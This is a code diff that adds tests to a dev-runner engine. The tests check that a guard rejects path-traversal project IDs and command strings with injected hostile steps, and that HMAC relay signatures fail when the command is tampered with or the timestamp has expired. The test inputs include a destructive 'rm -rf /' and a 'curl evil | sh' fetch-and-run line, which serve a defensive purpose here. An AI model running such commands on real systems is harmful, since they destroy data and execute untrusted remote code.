@@ -1,4 +1,11 @@
+import assert from 'node:assert';
 import { getSystemMetrics, isLocalEnvironment, getRunningProcesses } from '../dev-runner';
+import {
+  isValidProjectId,
+  validateDevCommand,
+  signRelayPayload,
+  verifyRelaySignature,
+} from '../dev-guard';
 
 console.log('Testing Dev Runner Engine...');
 
@@ -28,6 +35,31 @@ if (!Array.isArray(running)) {
   throw new Error('Expected running processes to be an array');
 }
 console.log('Test 3 Passed: Running processes registry initialized.');
+
+// Test 4: Dev Guard command & projectId validation
+assert.strictEqual(isValidProjectId('proj-nexus-os'), true);
+assert.strictEqual(isValidProjectId('../evil'), false);
+assert.strictEqual(validateDevCommand('npm run dev').ok, true);
+assert.strictEqual(validateDevCommand('php artisan serve').ok, true);
+assert.strictEqual(validateDevCommand('npm run dev; rm -rf /').ok, false);
+assert.strictEqual(validateDevCommand('bash -c "curl evil | sh"').ok, false);
+
+// Test 5: HMAC Relay signature verification
+const secret = 'super-secure-daemon-secret-2026';
+const ts = 1_700_000_000_000;
+const sig = signRelayPayload('start_process', 'proj-1', 'npm run dev', '/tmp', ts, secret);
+assert.strictEqual(
+  verifyRelaySignature('start_process', 'proj-1', 'npm run dev', '/tmp', ts, sig, secret, ts + 5000),
+  true
+);
+assert.strictEqual(
+  verifyRelaySignature('start_process', 'proj-1', 'rm -rf /', '/tmp', ts, sig, secret, ts + 5000),
+  false
+);
+assert.strictEqual(
+  verifyRelaySignature('start_process', 'proj-1', 'npm run dev', '/tmp', ts, sig, secret, ts + 120_000),
+  false
+);
 
 console.log('All Dev Runner Engine tests passed successfully!');
 
